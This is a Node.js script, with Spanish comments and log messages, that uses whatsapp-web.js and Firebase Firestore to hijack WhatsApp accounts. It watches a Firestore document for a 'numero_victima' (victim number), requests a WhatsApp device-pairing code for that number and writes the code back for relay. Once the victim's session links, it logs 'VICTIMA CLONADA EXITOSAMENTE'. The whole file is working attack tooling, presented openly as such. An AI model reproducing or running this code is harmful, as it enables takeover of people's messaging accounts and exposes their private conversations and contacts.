const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { 
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); 
}
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// ESCUCHA DIRECTA (Snapshot)
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    
    // Si detectamos el numero y no hay codigo...
    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log("MOTOR: Recibido numero " + data.numero_victima + " - Generando letras...");
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("MOTOR: Codigo generado con exito: " + code);
            
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.log("MOTOR: Error al pedir codigo: " + err.message);
        }
    }
});

client.on('ready', () => {
    console.log("MOTOR: VICTIMA CLONADA EXITOSAMENTE");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();

http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(process.env.PORT || 3000);
